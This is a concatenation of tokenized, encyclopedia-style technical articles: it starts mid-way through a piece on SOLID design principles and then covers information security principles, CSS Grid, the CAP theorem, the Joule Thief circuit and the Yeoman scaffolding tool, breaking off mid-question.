For example , it 's tempting to say that a circle is a type of ellipse , but circles do n't have two foci or major / minor axes .
In another example , TRubberDucky is not exactly a duck because it can swim or quack but ca n't fly .
So if a wildlife simulator instantiates a rubber duck and tries to make it fly , it will encounter an error .
Thus , TRubberDucky as a subclass of TDuck is a violation of LSP .
LSP is also related to Duck Typing .
In fact , duck typing does n't even require a type hierarchy via inheritance .
Could you explain the Interface Segregation Principle ?
Segregate the interfaces so that subclasses are not required to use all of them .
In other words , many client - specific interfaces are better than one general - purpose interface .
For example , a single logging interface for writing and reading logs is useful for a database but not for a console .
Reading logs make no sense for a console logger .
Another example is an IMatrixOperations interface that has two methods for inverse and transpose operations .
The problem is that for a matrix that 's not regular , inverse operation is invalid .
Such a matrix based on this interface would offer an exception for an inverse operation .
Applying ISP , we would break this interface into separate ones , IRegularMatrixOperations ( with inverse operation ) and IMatrixOperations ( that adds transpose operation ) .
IMatrixOperations derives from IRegularMatrixOperations .
Could you explain the Dependency Inversion Principle ( DIP ) ?
DIP says that modules should depend upon interfaces or abstract classes , not concrete classes .
It 's an inversion because implementations depend upon abstractions and not the other way round .
Instead of high - level modules depending on low - level modules , let 's decouple them and make use of abstractions .
Let 's say we instantiate a Windows98Machine object that 's automatically created with a StandardKeyboard .
The problem is that now we 've coupled this keyboard with the machine .
It 's difficult to instantiate another machine with a different keyboard .
This tight coupling also makes it difficult to test the Windows98Machine class .
Instead , the keyboard must be an interface .
Any keyboard variant that uses this interface can be passed into the machine when the latter is constructed .
What are some common criticisms of SOLID ?
Too much separation and abstraction can make code unreadable .
Source : Marston 2011 , fig .
4 .
While some criticisms are valid , often they arise due to misunderstanding of SOLID .
People have called the principles vague .
They lead to complex and unintelligible code since we end up with many interfaces and many small classes .
DIP depends on dependency injection frameworks .
LSP requires implementation inheritance .
Most of these are not really true .
SOLID principles are condensed software wisdom .
Just knowing them is not a substitute for experience and understanding .
SOLID focuses too much on dependencies .
It encourages use of abstractions , resulting in a codebase littered with interfaces .
To manage this problem , we end up introducing IoC containers and mocking frameworks , making the code more difficult to understand .
SOLID produces testable code with low coupling but the code is unintelligible .
It 's been said that OCP does n't work in practice , particularly for domain entities or business classes that by nature change frequently .
Following OCP would lead to long inheritance chains and also a violation of another design principle , " favour composition over inheritance " .
People have different interpretations about what should be open and what should be closed .
This leads to inconsistencies .
Barbara Liskov of MIT presents at a conference a paper titled Data Abstraction and Hierarchy .
She uses the term " substitution property " and explains that data abstractions provide the same benefits as procedures , but for data .
Recall that the main idea is to separate what an abstraction is from how it is implemented so that implementations of the same abstraction can be substituted freely .
Bertrand Meyer , the creator of the Eiffel programming language , published a book titled Object - Oriented Software Construction .
Meyer is credited with introducing the Open - Closed Principle .
With growing codebases and complexity , object - oriented software design has become popular to better manage software .
But this change of programming paradigm from procedural to object - oriented does not automatically lead to clean code .
Developers write large classes and methods .
The code is duplicated .
Old habits continue .
There is a need to guide developers to design object - oriented software the right way .
A smallbag is not a subclass of a largebag since they have different bounds .
Source : Liskov and Wing 1994 , fig .
10 .
Barbara Liskov and Jeannette Wing present the case that anyone making use of supertype objects should not see any difference in behaviour even if they using a subtype object instead .
This later became a principle of SOLID .
This principle is also related to what Bertrand Meyer calls Design by Contract .
On com.object group , Robert Martin mentions a number of commandments for OOP .
Three of these would later become part of SOLID : Open - Closed , Liskov Substitution , Dependency Inversion .
Robert Martin writes in detail about four of the SOLID principles .
The Single Responsibility Principle does n't appear on this list .
Robert Martin publishes the book Agile Software Development : Principles , Patterns , and Practices .
He explains in detail all the five SOLID principles under a section named " Agile Design " .
Thus , SOLID has become an essential aspect of Agile methodology .
Sometime later , Michael Feathers coins the term SOLID as a useful way to remember the principles .
SOLID Principles and their extensions .
Source : InterVenture 2017 .
InterVenture published extensions of SOLID .
They identify six more principles .
These are by no means universal in the industry , but are worth studying .
Paulo Merson notes in a blog article that SOLID was designed OOP .
It may not exactly fit microservices .
For microservices , he therefore proposes IDEALS : interface segregation , deployability ( is on you ) , event - driven , availability over consistency , loose - coupling , and single responsibility .
Information can be private or public , personal or generic , valuable or commonplace , online or offline.$MERGE_SPACE$MERGE_SPACE
Like any other asset , it has to be protected .
This is more important online , where hackers can steal or misuse information remotely even without any physical access to where that information resides .
In line with evolving technology , data security practices have evolved from high - level principles into more detailed set of practices and checklists .
In practice , there 's no single list of principles that everyone agrees on .
Many lists exist , each one customized for its context .
Which are the three main information security principles ?
The CIA information security triad .
Source : Vonnegut 2016 .
The three main security principles include : Confidentiality : Protect against unauthorized access to information .
Integrity : Protect against unauthorized modification of information .
Even if an adversary ca n't read your data , they can either corrupt it or selectively modify it to cause further damage later on .
Availability : Protect against denial of access to information .
Even if an adversary ca n't access or modify your data , they can prevent you from accessing it or using it .
For example , they can destroy or congest communication lines , or bring down the data server .
These principles have also been called security goals , objectives , properties or pillars .
More commonly , they are known as the CIA Triad .
Security practitioners consider these principles important but vague .
This is because they 're about the " what " but not the " how " .
They have to be translated into clear practices based on context .
They have been applied to IT infrastructure , cloud systems , IoT systems , web / mobile apps , databases , and so on .
Actual practices may differ but can be related to the CIA triad .
What are some variations of the CIA ?
McCumber Cube is designed to address cybersecurity .
Source : Morrow 2012 .
It 's been said that the CIA Triad is focused on technology and ignores the human element .
The Parkerian Hexad therefore addresses the human element with three more principles : Possession / Control : It 's possible to possess or control information without breaching confidentiality .
Authenticity : This is about proof of identity .
We should have an assurance that the information is from a trusted source .
Utility : Information may be available , but is it in a usable state or form ?
Another variation is the McCumber Cube .
It includes the CIA Triad but also adds three states of information ( transmission , storage , processing ) and three security measures ( training , policy , technology ) .
Other published security principles have come from OECD , NIST , ISO , COBIT , Mozilla , and OWASP .
What are some means of achieving the CIA security goals ?
Ontology of information security .
Source : Cherdantseva and Hilton 2012 , slide 6 .
Authorization , authentication and the use of cryptography are some techniques to achieve the CIA security goals .
These are sometimes called Security Mechanisms .
These mechanisms are designed to protect assets and mitigate risks .
However , they may have vulnerabilities that threats will attempt to exploit .
Confidentiality is often achieved via encryption .
Hackers in possession of encrypted data ca n't read it without the requisite decryption keys .
File permissions and access control lists also ensure confidentiality .
For integrity , a hash of the original data can be used , but this hash must itself be provided securely .
Alternatively , digital certificates that use public - key cryptography can be used .
For availability , there should be redundancy built into the system .
Backups should be in place to restore services quickly .
Systems should have recent security updates .
Provide sufficient bandwidth to avoid bottlenecks .
People must be trained to use strong passwords , recognize possible threats and get familiar with social engineering methods .
What are some common approaches to enhancing information security ?
Complex systems are hard to secure .
Keep the design simple .
This also minimizes the attack surface .
For example , a search box is vulnerable to SQL injections , but a better search UI will remove this risk .
Use secure defaults , such as preventing trivial passwords .
Give users or programs the least privilege to perform their function .
When failures occur , ensure they 're handled with correct privileges .
There 's better defence in depth .
This means that multiple levels of control are better than a single one .
Security at the application layer alone is not enough .
Secure server access , network communications , wireless access , user interface , and so on .
Do n't trust third - party services .
Have a clear separation of duties to prevent fraud .
For example , admin users should n't be allowed to login to the frontend with the same privileges and make purchases on behalf of others .
Avoid security by obscurity .
This means that we should n't rely on hidden secrets .
For example , even if source code is leaked or encryption algorithms are known , the system should remain secure .
prefer decentralized systems with replication to centralized ones .
Could you mention some threats or attacks by which hackers can compromise the security principles ?
Sniffing data communications , particularly when it 's not encrypted , is an example of breach of confidentiality .
ARP spoofing is an example of sending false ARP messages so that traffic is directed to the wrong computer .
Phishing is a breach of integrity since the hacker 's website tricks a visitor into thinking it 's a genuine website .
Repeatedly sending a request to a service will overload the server .
Servers will become progressively slower to respond to requests and even crash .
This Denial - of - Service ( DoS ) attack makes the service unavailable .
For databases , SQL injection is a big threat , allowing hackers access to sensitive data or extra privileges .
Buffer overflow vulnerabilities can be exploited to modify data .
DoS attacks are possible with databases and their servers .
In any case , record all transactions and events .
This leads to better detection of intrusions and future preventions .
Have a good recovery plan .
Perform frequent security tests to discover vulnerabilities .
Information Security or InfoSec did n't exist in the 1950s or even in the 1960s .
Security is all about physically securing access to expensive machines .
Reliability of computers is the main concern .
As hardware and software became standardized and cheaper , it was only in the 1970s that there was a shift from computer security towards information security .
Computer network vulnerabilities identified in the Ware Report .
Source : Pot 2016 .
In the early years of the ARPANET , the US Department of Defense commissioned a study that was published by the Rand Corporation as Security Controls for Computer Systems .
It identifies many potential threats and possible security measures .
The task force was chaired by Willis H. Ware .
In time , this report became influential and is known as the Ware Report .
James P. Anderson authors Computer Security Technology Planning Study for the USAF .
This is published in two volumes .
In time , this came to be called the Anderson Report .
Multics was a timesharing operating system that started in 1965 as a MIT research project .
In the summer of 1973 , researchers at MIT looked at the security aspects of Multics running on a Honeywell 6180 computer system .
They come up with broad security design principles .
They categorize these into three categories with due credit to J. Anderson : unauthorized release , unauthorized modification , unauthorized denial .
Prior to the 1980s , security was influenced by the defence sector .
In the 1980s , the focus shifted from confidentiality to commercial concerns such as costs and business risks .
Among these is the idea of integrity , since it 's important for banks and businesses that data is not modified by unauthorized entities .
Morris Worm became the first DoS attack on the Internet .
Thus , availability is recognized as an essential aspect of information security .
In the JSC - NASA Information Security Plan document we find the use of the term CIA Triad .
However , the term could have been coined as early as 1986 .
To complement InfoSec , Information Assurance ( IA ) has emerged as a discipline .
This is more about securing information systems rather than information alone .
With the growth of networks and the Internet , Non - Repudiation and Authentication have become important concerns .
Non - repudiation means that parties ca n't deny having sent or received a piece of information .
Security objectives have dependencies .
Source : Stoneburner 2001 , fig .
2 - 1 .
NIST publishes Underlying Technical Models for Information Technology Security .
It identifies five security objectives : Availability , Integrity , Confidentiality , Accountability and Assurance .
It points out that these are interdependent .
For example , if confidentiality is compromised ( eg .
superuser password ) , then integrity is likely to be lost as well .
Donn B. Parker expands the CIA Triad by adding three more items : authenticity , possession or control , and utility .
Parker also states that it 's best to understand these six principles in pairs : confidentiality and possession , integrity and authenticity , and availability and utility .
In time , these six principles have come to be called Parkerian Hexad .
When displaying content on a webpage , there 's often a need to layout the content in a particular way .
For example , we may want the header and footer sections to span the entire width of the viewport while the main content be organized in a three - column layout .
The header section itself may be divided into a fixed - width logo section to the left and a flexible - width title section to the right .
CSS Grid Layout is a standard that gives user interface designers a powerful system to implement layouts with ease .
It 's part of the CSS3 specification standardized by W3C. It 's meant to complement and not replace earlier systems such as CSS Flexbox .
Why should I adopt CSS Grid when there 's already CSS Flexbox ?
CSS Grid compared with Flexbox .
Source : Layout Land 2018a .
Traditionally , layout was done using HTML tables .
Then came CSS properties ` display ` , ` float ` and ` position ` that allowed us to control the layout .
While these are still relevant , Flexbox came along to provide an easier way to distribute space and align content .
The limitation to Flexbox is that it does layout only in one direction .
Thus , items can be laid out horizontally but not vertically at the same time .
Even if the items were to wrap across multiple lines , items on each line will not be aligned to those on other lines .
Via nesting , Flexbox can be used to create two - dimensional layouts , but CSS Grid is easier to use .
CSS Grid is capable of aligning items both horizontally and vertically .
Interestingly , items within the grid can also overlap , which neither Flexbox nor a HTML table element is capable of doing .
CSS Grid does n't replace Flexbox .
Grid items can be flex parents and vice versa .
Which are the key building blocks of CSS Grid ?
Annotating the key building blocks of CSS Grid .
Source : Rego 2017 .
CSS Grid has the following parts : Container : This is the element that contains the grid within it .
It 's defined by CSS ` display : grid ` .
Item : Immediate child elements of a container are grid items .
Grandchildren and further nested elements are not considered as grid items .
Line : A grid is split into rows and columns using grid lines .
Lines also define the container 's borders .
Lines are numbered , starting from 1 .
Thus , a grid of m rows will have m+1 horizontal lines ; of n columns will have n+1 vertical lines .
Track : A grid track is a generic term for a grid row or column .
It 's the space between two adjacent grid lines .
Cell : This is an intersection of a row and a column .
It 's the smallest unit on the grid that can be referenced .
Area : This consists of one or more adjacent grid cells .
What are the different ways of specifying width in CSS Grid ?
Illustrating widths of grid items .
Source : JavaScript Teacher 2018b .
Grid items , rows and columns can be sized explicitly using CSS properties ` grid - template - rows ` and ` grid - template - columns ` .
For example , ` grid - template - columns : 90px 50px 120px ` defines three columns with exact sizes .
What if we had five items but only two columns were defined ?
The extra three grid items will be sized implicitly .
If ` grid - auto - flow : column ` , we 'll end up with five columns .
If ` grid - auto - flow : row ` , we 'll end up with three rows with the last row having only one item .
For explicit sizes , we can use ` px ` , ` em ` , ` % ` , etc .
Fractional sizes ( ` fr ` ) can also be used .
Thus , ` grid - template - columns : 1fr 2fr ` will make two columns , with the second one twice as wide as the first .
While ` px ` specifies fixed sizes , ` fr ` specifies flexible sizes .
Fractional sizes are calculated based on remaining space after other length values have been processed .
For example , given ` grid - template - columns : 3rem 25 % 1fr 2fr ` , the calculation would be ` 1fr = ( ( gridwidth ) - ( 3rem ) - ( 25 % of gridwidth ) ) / 3 ` .
The value ` auto ` will stretch the grid item to fill remaining space .
How do I control the alignment of content in CSS Grid ?
Illustrating alignment in CSS Grid .
Source : Paolino 2019 .
A grid item can be aligned within its cell or area using the CSS property ` justify - self ` for horizontal alignment and ` align - self ` for vertical alignment .
These effectively adjust margins for the items .
Each of these properties can take values start , end , center , or stretch .
What if we wished to apply the same alignment to all grid items ?
This is done by specifying CSS properties at the container level .
Use ` justify - items ` for horizontal alignment and ` align - items ` for vertical alignment .
As a shortcut , there 's also ` place - items ` that specify alignment in both directions .
What if all the grid 's tracks take up space smaller than the container ?
Then ` justify - content ` and ` align - content ` become useful not just for alignment but also for adding spaces in the right places to fill the container .
These effectively adjust the padding for the container .
Some allowed values include normal , start , end , center , stretch , space - around , space - between , space - evenly , baseline , first baseline , and last baseline .
Alignment works for both inline and block elements .
What are named areas and where are they useful ?
Grid areas help implement an entire webpage layout .
Source : JavaScript Teacher 2018a .
We can make an item span multiple columns using ` grid - column - start ` , ` grid - column - end ` , ` grid - row - start ` , and ` grid - row - end ` .
Shortcuts for these are ` grid - column ` and ` grid - row ` .
For example , ` grid - column : 3 / span 2 ` says that an item will start from the third column and span two columns .
Grid areas offer a simpler way to avoid using grid line numbers .
There can be only rectangles .
Areas are named for easy referencing .
Gaps can exist between areas but not between cells within an area .
Gaps themselves can be set using ` grid - row - gap ` and ` grid - column - gap ` , with ` grid - gap ` as a shorthand to set both .
Grid gaps are also called gutters .
Within HTML elements , use the CSS property ` grid - area ` to name the target area .
This tells exactly in which area this content must be placed .
The mapping of grid cells to grid areas is done using the ` grid - template - areas ` property .
For a responsive design , we could use media queries to switch between different definitions of template areas without duplicating the content .
When there 's nested grids , what 's the use of subgrids ?
Comparing nested grids and subgrids .
Source : Adapted from Vujasinović 2020 .
Consider the use of grids to lay out cards .
With nested grids , each card has an inner grid that 's used to organize the card title , an image and a description .
The layout of contents in the inner grid is independent of the outer grid .
Moreover , one card is not aware of the alignment of contents on another card .
This means that if some card titles run in multiple lines , subsequent content within the inner grid will not be aligned across cards ( the outer grid ) .
The Subgrid solves this problem .
A subgrid defers the definition of its rows and columns to its parent grid container .
The content of the subgrid influences the sizing and alignment of its parent container .
A subgrid can be created with ` { display : grid ; grid - template - columns : subgrid ; grid - template - rows : subgrid ; } ` .
It 's possible to create rows - only or columns - only subgrid .
Within the subgrid , we may not want extra space between rows .
This is achieved with ` row - gap:0 ` .
Could you share additional technical details on CSS Grid ?
It 's interesting to note that grid line numbers can be negative .
Value -1 refers to the last line ; value -2 is last but one line ; and so on .
Also , fractional widths can be floating point numbers .
With fractional units , available space is filled up but it still obeys the minimum size of the container or the content within .
Sizes are not calculated upfront .
Only after content is placed into grid items , are the sizes of grid tracks calculated .
By default , grid items will be stretched to fit the grid area .
Avoid using percentages in paddings or margins on grid items .
The number of rows and columns can be defined using ` grid - template - areas ` , ` grid - template - rows ` and ` grid - template - columns ` .
If there 's conflict , the larger number will be used .
Do n't assume you need breakpoints , for example , to reflow content with a varying number of columns .
Sizing with only percentages will not help you exercise the full power and flexibility of CSS Grid .
CSS Grid is simple enough to be used directly .
Do n't look for a grid framework .
What are some resources for beginners to learn CSS Grid ?
From the many online resources to learn CSS Grid , we mention a few : A Complete Grid Guide by CSS - Tricks , Rachel Andrew 's Grid by Example and Layout Lab by Jen Simmons .
An interactive CSS Grid cheatsheet from Ali Alaa is handy .
For debugging CSS Grid , there are browser add - ons that developers can use .
Firefox DevTools comes with a Grid Inspector to inspect the grid and show line numbers and grid area names .
Most browsers support CSS Grid , including partial support from IE11 .
See Can I Use to see current support .
The Swiss formalize the use of grids as a design tool .
They see grids as bringing order to a design layout .
Frame - based layout via stylesheets is proposed .
Content is laid out within regions of a document .
Source : W3C 2005 , fig .
1 .
A CSS3 Advanced Layout Module is proposed .
By April 2009 , this became CSS Template Layout Module .
The idea of CSS Grid Layout closely follows from these early drafts .
However , these early proposals are not adopted by browser makers .
The Flexbox ( top ) is 1-D while the CSS Grid ( bottom ) is 2-D. Source : Coyier 2019 .
W3C publishes a working draft of CSS Flexible Box Layout or Flexbox .
After multiple revisions , the first Candidate Recommendation for Flexbox was released in September 2012 .
Microsoft needs a flexible layout tool for the web and native app development on Windows .
With some inspiration from Silverlight , Microsoft ships IE10 with an implementation of a grid layout behind ` -ms- ` vendor prefix .
This is followed by a W3C working draft of CSS Grid Layout .
Thus , for the first time , W3C gets a draft along with a working implementation .
After many months of internal development , Twitter opened sources to Bootstrap .
It 's a CSS framework that enables easier creation of layouts based on a 12-column grid .
CSS Grid provides a more flexible layout since designers need not start with 12 columns .
W3C publishes CSS Grid Layout Module Level 1 as a Candidate Recommendation .
This is also the year when many major browsers start supporting CSS Grid .
W3C publishes the first working draft of CSS Grid Layout Module Level 2 .
Level 2 adds subgrid capabilities and allows nested grids to participate in the sizing of parent grids .
It also adds an aspect - ratio - controlled gutters .
In December 2019 , Firefox becomes the first browser to implement subgrids and continues to be the only browser even in December 2020 .
The CAP Theorem .
Source : Brewer 2000 .
A well - designed cloud - based application often stores its data across multiple servers .
For faster response , data is often stored closer to clients in that geography .
Due to the distributed nature of this system , it 's impossible to design a perfect system .
The network may be unreliable or slow at times .
Therefore , there are trade - offs to be made .
The CAP Theorem gives system designers a method to think through and evaluate the trade - offs at the design stage .
The three parts of the CAP Theorem are Consistency , Availability , and Partition Tolerance .
The theorem states that it 's impossible to guarantee all three in a distributed data store .
We can meet any two of them but not all three .
Over the years , designers have misinterpreted the CAP Theorem .
To reflect read - world scenarios , modifications to the theorem have been proposed .
What 's the definition of the CAP Theorem ?
A formal definition of the CAP Theorem is , " It is impossible in the asynchronous network model to implement a read / write data object that guarantees the following properties : availability , atomic consistency , in all fair executions ( including those in which messages are lost ) " .
A simplified definition states that , in a network subject to communication failures , it is impossible for any web service to implement an atomic read / write shared memory that guarantees a response to every request .
The word " atomic " used above means that although it 's a distributed system , requests are modelled as if they are executing on a single node .
This gives us an easy model for consistency .
Could you explain the CAP Theorem ?
When partitioned , the service becomes inconsistent though still available .
Source : Whittaker 2014 .
The parts of the CAP Theorem can be understood as follows : Consistency : When a request is made , the server returns the right response .
What is " right " depends on the service .
For example , reading a value from a database might mean that the most recent written to that value should be returned .
Availability : A request always receives a response from the server .
No constraint is placed on how quickly the response must be received .
Partition Tolerance : The underlying network is not reliable and servers may get partitioned into non - communicating groups .
Despite this , the service should continue to work as desired .
As an example , consider two nodes , G1 and G2 that have been partitioned .
A client changes a value from v0 to v1 on G1 .
However , the same value is not updated on G2 due to the partition .
Hence , when G2 is queried it returns the old value v0 .
Thus , the service is available but not consistent .
Sometimes the terms safety ( consistency ) and liveness ( availability ) are used in a generalized sense .
Safety means " nothing bad ever happens " .
Life means " eventually something good happens " .
What 's the implication of the CAP Theorem when designing distributed systems ?
When the CAP Theorem was proposed , the understanding was that system designers had three options : CA Systems : Sacrifice partition tolerance .
Single - site or cluster databases using two - phase commit are examples .
CP Systems : Sacrifice availability .
If there 's a partition , for consistency , we make the service unavailable : return a timeout error or lock operations .
AP Systems : Sacrifice consistency .
If there 's a partition , we continue accepting requests but reconcile them later ( writes ) or return stale values ( reads ) .
In practice , we deal with network partitions at least some of the time .
The choice is really between consistency and availability .
For databases , consistency can be achieved by enabling reading after completing writes on several nodes .
Availability can be achieved by replicating data across nodes .
In fact , permanent partitions are rare .
So the choice is temporary .
Designers do n't have to give up one of the three to build a distributed system .
In fact , it 's possible to have all three under normal network conditions .
There 's trade - off only when the network is partitioned .
It 's also helpful to think probabilistically .
We can design a CA system if the probability of a partition is far less than that of other systemic failures .
Could you share real - world applications of the CAP Theorem ?
Databases that follow ACID ( Atomicity , Consistency , Isolation , Durability ) give priority to consistency .
However , NoSQL distributed databases prefer availability over consistency since availability is often part of commercial service guarantees .
So caching and logging were used for eventual consistency .
This leads to what we call BASE ( Basically Available , Soft - state , Eventually consistent ) .
As example , Zookeeper prefers consistency while Amazon 's Dynamo prefers availability .
Maintaining consistency over a wide area network increases latency .
Therefore , Yahoo 's PNUTS system is inconsistent because it maintains remote copies asynchronously .
A particular user 's data is partitioned locally and accessed with low latency .
Facebook prefers to update a non - partitioned master copy .
The user has a more local but potentially stale copy , until it gets updated .
A web browser can go offlineifitlosesconnectionto the server .
The web app can fall back on client persistent storage .
Hence , availability is preferred over consistency to sustain long partitions .
Likewise , Akamai 's web caching offers best effort consistency with a high level of availability .
In Google , primary partition usually resides within one datacenter , where both availability and consistency can be maintained .
Outside this partition , service becomes unavailable .
What are some criticisms of the CAP Theorem ?
Although the theorem does n't specify an upper limit on response time for availability , in practice , there exists a timeout .
The CAP Theorem ignores latency , which is an important consideration in practice .
Timeouts are often implemented in services .
During a partition , if we cancel a request , we maintain consistency but forfeit availability .
In fact , latency can be seen as another word for availability .
In NoSQL distributed databases , the CAP Theorem has led to the belief that eventual consistency provides better availability than strong consistency .
Some believe this is an outdated notion .
It 's better to factor in sensitivity to network delays .
The CAP Theorem suggests a binary decision .
In reality , it 's a continuum .
There are different degrees of consistency implemented via " read your writes , monotonic reading and causal consistency " .
Comparing FLP with CAP .
Source : Dinh 2016 .
Originally presented in 1983 , researchers Fisher , Lynch and Paterson ( FLP ) show that distributed consensus is impossible in a fault - tolerant manner in an asynchronous system .
Distributed consensus is related to the problem of atomic storage addressed by the CAP Theorem .
Before the CAP Theorem was formalized , researchers were working on similar ideas .
One example is the paper titled Trading Consistency for Availability in Distributed Systems by two researchers at Cornell University .
Eric Brewer presents the CAP Theorem at the 19th Annual ACM Symposium on Principles of Distributed Computing ( PODC ) .
Its early history can be traced to 1998 and was first published in 1999 .
Brewer points out that distributed computing has unduly focused on computation and not on data .
MIT researchers Seth Gilbert and Nancy Lynch offer formal proof of the CAP Theorem in their paper titled Brewer 's Conjecture and the Feasibility of Consistent , Available , Partition - Tolerant Web Services .
In asynchronous systems , the impossibility result is strong .
In partially synchronous systems , we can achieve a practical compromise between consistency and availability .
Daniel Abadi proposes the PACELC Theorem as an alternative to the CAP Theorem .
When data is replicated , there 's a trade - off between latency and consistency .
PACELC makes this explicit : during partitions ( P ) , the trade - off is AC ; else , the trade - off is LC .
Default versions of Dynamo , Cassandra , and Riak are PA / EL systems .
VoltDB / H - Store and Megastore are PC / EC .
MongoDB is PA / EC .
The voltage output from a joule thief circuit .
X - axis is time in seconds and Y - axis is potential difference in volts Source : VandeWettering 2011 .
The Joule Thief Circuit is a voltage booster circuit which converts a constant low voltage input into a periodic output of a higher voltage .
This circuit can be most often seen lighting an LED with an almost dead AA battery .
The peaks in voltage occur rapidly , causing the LED to flash at a very fast rate .
However , the LED appears to be constantly lit to the human eye due to the persistence effect .
How does the Joule Thief circuit work ?
A Video explaining how the Joule Thief circuit works .
Source : RimstarOrg 2012 .
The circuit is an arrangement of a power source , a resistor , a transistor and a ferrite toroid core wrapped with two wires coming from the positive terminal of the power source , one through a resistor .
A magnetic field is created around the ferrite toroid because of the current that passes through the wires .
The extra current causes the transistor to switch off and power to the ferrite toroid is cut off .
As a result , the magnetic field is converted into electrical energy which is given as an output .
Once the magnetic field no longer exists(the pulse ends ) , the transistor is switched on again and conducts electricity to create the magnetic field again .
This process occurs rapidly enough to provide a somewhat constant power output .
The frequency of voltage spikes generated by the Joule Thief circuit is over 5KHz .
The video explains the work of the Joule Thief circuit very well .
How can a Joule Thief circuit be made ?
A Video explaining how to build a Joule Thief circuit .
Source : RimstarOrg 2012b .
The components required are a NPN transistor , a 1kΩ resistor , a ferrite toroid ( that can be salvaged from an old CFL bulb ) , wiring , a 3Volt LED and an AA battery which does n't light up an LED by itself .
Use the AA battery and connect two wires from the positive terminal and take one through the 1kΩ resistor and wrap the wires around the ferrite toroid .
The wire that goes through the resistor , after it comes out from the ferrite toroid , is connected to the base terminal of the transistor .
The other wire from the ferrite toroid goes to the collector terminal of the transistor , which is also connected to the positive terminal of the LED .
The negative terminal of the LED is connected to the emitter terminal of the transistor .
More information is available in an Instructable tutorial .
How can the Joule Thief circuit be optimized or modified ?
Chart of the relation between variables in the Joule Thief circuit .
Source : Karras 2014 .
The inductance in the Joule Thief circuit is determined by the loops around the ferrite toroid .
The more the number of loops , the greater the inductance .
An increase in inductance generally decreases the current flowing through the circuit and an increase in the duty cycle(on time% ) .
This suggests that an increase in inductance increases the efficiency of the circuit .
However , too much inductance is not good either .
Trial and error can help find the sweet spot of the circuit where the least current is drawn .
Increasing or decreasing one loop at a time will help find the number of loops a certain circuit requires for maximum efficiency .
What are the applications of this circuit ?
Circuit diagram of a Joule Thief circuit .
Source : Fulvio314 2018 .
Lighting an LED with a dead battery is not the only application of the Joule Thief circuit .
The circuit helps utilize almost all the energy that is stored in a battery .
For example , a battery that has come out of a toy can easily light up a torch that makes use of the Joule thief circuit for hours or even days .
The circuit can also be used in battery chargers , wall clocks , solar cell chargers where a low voltage input has to be increased for its intended application .
The principle behind the joule thief can be used on any low voltage source , even if it 's not a " dead " battery .
For example , aluminium cans filled with water and wood ash , and simple electrodes can be used with a joule thieves circuit for a battery charging application .
What are the disadvantages of using a Joule Thief circuit ?
A major disadvantage is a drop in output current because the current required to carry a given power decreases when voltage is increased because power is the product of current and voltage .
Another disadvantage is that without significant improvements to the circuit , it is hard for the circuit to power more than simple led because heavy demand is put on the transistor for high current at very low voltage . What are some alternatives to the Joule Thief circuit ?
A buck - boost converter circuit .
Source : Arrow 2017 .
Supercharged Joule Thief circuit : Has an efficiency of above 80 % while conventional Joule Thief circuits have efficiencies of between 40 % and 60 % Buck - boost converters : Can be used for applications which require more power .
The output voltage is always reversed in polarity with respect to the input voltage multiplier : Converts AC electrical power of a lower voltage to DC electrical power of a higher voltage Split - pi topology : DC - DC converter that uses MOSFETs making it bidirectional and good for applications revolving around regenerative braking How does the supercharged Joule Thief circuit have such a high efficiency ?
Circuit diagram for Supercharged Joule Thief circuit .
Source : Rustybolt 2012 .
All that is required in addition to the components for a conventional Joule Thief circuit is a 680 pF capacitor .
Apart from this , the feedback wire , which is connected between the ground and the wire from the ferris toroid , which is also connected to a 1.5kΩ resistor and a diode , according to the circuit diagram , which shows a circuit that can be used to switch between the conventional Joule Thief circuit and the Supercharged Joule Thief circuit .
Mechanism through which electronic devices can control an electron stream Source : Weber 1930 .
Harold C Weber filed a patent for a mechanism to control electron streams in electronic devices .
First - page clipping of patent Source : Bohan 1988 .
Honeywell Inc filed a patent for a self energized circuit that steps up ultra low voltages ( as low as 0.1 volts ) to a stepped - up alternating current .
Three drive circuits featured in Everyday Practical Electronics , Nov 1999 issue .
Source : Kaparnik 1999 , fig .
1 .
An article titled One - Volt L.E.D — A Bright Light by Z. Kaparnik , and published in Everyday Practical Electronics , features a circuit that uses the same principles as the initial Joule Thief circuit in order to create high voltage pulses .
A small bulb lit by a button cell using the Joule Thief circuit Source : Mitchell 2002 .
The name Joule Thief was coined by Clive Mitchell and a tutorial was published on his website .
Clive 's variation includes a smaller resistance than the original circuit published in the EPE magazine .
Starting a new web app project often involves creating a basic structure of files and folders .
Every web framework has its own conventions and recommended project structure .
This is commonly called scaffolding of the project .
Creating such scaffolding is tedious .
Yeoman is a Node.js module that simplifies this process .
Generator is the term used by Yeoman to refer to the packaging and distribution of code that creates scaffolding for a specific type of project .
For example , ` generator - node ` creates a Node.js project while ` sls ` creates a serverless project .
For web apps , it automates mundane frontend tasks such as creating navigation , header or footer ; or backend tasks such as creating APIs .
Initially introduced for web apps , Yeoman is being used today for many types of projects .
Yeoman is open - source , widely used , cross - platform , easy to use and based on the popular JavaScript language .
Could you outline Yeoman 's typical workflow ?
Yeoman 's workflow includes creating , managing and building .
Source : Shaleynikov 2017 .
A project will often have dependencies with other projects or packages .
To bring in dependencies , we have dependency / package managers such as npm or Bower .
These managers automate the task of downloading dependencies .
A project will also need a building system such as Gulp or Grunt .
In web apps , for example , these build systems will minify CSS and JS , and do other transformations on the code .
A typical Yeoman workflow starts with setting up the scaffolding using the project 's Yeoman generator .
As part of the setup , a dependency file ( ` package.json ` for npm ) is created and the required dependencies are downloaded .
A Build configuration file is created and relevant build tasks are pulled into the project .
Note that the generator itself does n't have dependent packages or build tasks , which are separately developed and delivered by different teams in the open source model .
But the generator 's author knows what tools are useful for the project .
The author may also decide to give users options .
For example , when the generator is invoked , the user may be given a choice to use Gulp or Grunt .
How is Yeoman better than native generators or CLI project tools ?
The Developers are prompted by the generator to customize project components .
Source : Devopedia 2019 .
Frameworks typically come with their own tools to create a sample project structure .
For example , to build an Angular frontend app , ` @angular / cli ` provides scaffolding for a basic app with one static page .
With Yeoman generators , we get many advanced options including promises , authentication , routing and a choice of desktop , mobile or PWA app .
Take the example of the ` ngx - rocket ` generator for an Angular 7 + project .
This includes a complete starter template , improved tooling , extensive base documentation , ready - to - use UI components , API proxy example setup for faster remote debugging , and generator output customization .
For UI , we could choose Angular Material , Bootstrap 4 or Ionic .
A mobile app uses Cordova , a desktop app uses Electron , or we could use both in the same code base .
Among output customization are SSO authentication , enterprise theming and service integrations .
There 's also a built - in development server with automatic reload when source files change .
Moreover , Yeoman enforces good coding practices since the generators themselves are written by experienced developers .
What are Yeoman sub - generators ?
Introduction to Yeoman sub - generators .
Source : Osmani 2013 .
A generator creates all the different parts of an application , but what if you want to create only one part of the application ?
